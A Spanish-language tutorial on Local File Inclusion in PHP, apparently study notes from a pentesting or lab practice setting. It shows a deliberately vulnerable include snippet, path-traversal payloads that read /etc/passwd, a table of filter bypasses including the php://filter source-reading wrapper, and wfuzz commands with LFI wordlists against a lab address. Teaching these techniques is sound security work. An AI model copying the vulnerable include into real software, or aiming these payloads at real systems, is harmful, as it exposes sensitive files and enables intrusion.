
## 📑 Índice de Contenidos

1. [🔥 Ejemplo vulnerable](#-ejemplo-vulnerable)
2. [❌ ¿Qué hace mal este código?](#-qué-hace-mal-este-código)
3. [🔍 ¿Cómo sospechamos que puede haber un LFI?](#-cómo-sospechamos-que-puede-haber-un-lfi)
4. [🔁 Bypasses comunes](#-bypasses-comunes)
5. [🤖 Automatizando con `wfuzz`](#-automatizando-con-wfuzz)
6. [🔎 Caso práctico: LFI en `login.php`](#-caso-práctico-lfi-en-loginphp)




🗂️ LFI (Local File Inclusion)
Una mala configuración en una aplicación web puede permitir al atacante incluir archivos del sistema, revelando información sensible. A continuación, un ejemplo típico en PHP:

🔥 Ejemplo vulnerable
```
<?php
// archivo: index.php

if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    include("home.php");
}
?>
```

❌ ¿Qué hace mal este código?
Usa directamente $_GET['page'] sin validación.

  -Permite al atacante incluir archivos arbitrarios.

  -Por ejemplo, el siguiente payload puede mostrar el contenido de /etc/passwd en sistemas Linux:
  ```
  http://ejemplo.com/index.php?page=../../../../etc/passwd
  ```

## 🔍 ¿Cómo sospechamos que puede haber un LFI?
URLs como estas son sospechosas:
```
http://victima.com/index.php?page=home
http://victima.com/?template=about
http://victima.com/view.php?file=readme.txt
```
Prueba incluir archivos del sistema:
```
http://victima.com/index.php?page=../../../../../../../etc/passwd
```
🧪 Si es vulnerable, verás algo como:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

## 🔁 Bypasses comunes

Si hay validaciones o filtros, intenta con variantes como:

| Técnica                                  | Ejemplo                                                                          |
| ---------------------------------------- | -------------------------------------------------------------------------------- |
| Null byte (en versiones antiguas de PHP) | `../../../../../etc/passwd%00`                                                   |
| Agregar signo de pregunta                | `../../../../../etc/passwd?`                                                     |
| Rutas con doble punto y slash mezclados  | `....//....//etc/passwd`                                                         |
| Wrappers de PHP                          | `php://filter/convert.base64-encode/resource=index.php` (para ver código fuente) |


## 🤖 Automatizando con wfuzz

Puedes usar wfuzz con diccionarios específicos para encontrar rutas LFI:
```bash
wfuzz -u "http://target.com/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulcore.txt
```
Diccionarios útiles:

  -/usr/share/seclists/Fuzzing/LFI/

  -SecLists/Fuzzing/LFI/LFI-Jhaddix.txt

## 🔎 Caso práctico: LFI en login.php

Supón que descubres esta URL:
```bash
http://172.17.0.2/login.php
```
Y sospechas que puede tener un parámetro vulnerable. Primero intentamos descubrir el nombre del parámetro:
```bash
wfuzz -c --hc=404 -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
"http://172.17.0.2/login.php?FUZZ=/etc/passwd"
```
👀 Observas que la mayoría de las respuestas tienen 1036 caracteres. Puedes filtrarlas con --hh:
```bash
wfuzz -c --hc=404 --hh=1036 -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
"http://172.17.0.2/login.php?FUZZ=/etc/passwd"
```
✅ Esto revela que el parámetro vulnerable es file. Ahora prueba un payload con un diccionario de LFI:
```bash
wfuzz -c --hc=404 --hh=1036 -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
"http://172.17.0.2/login.php?file=FUZZ"
```
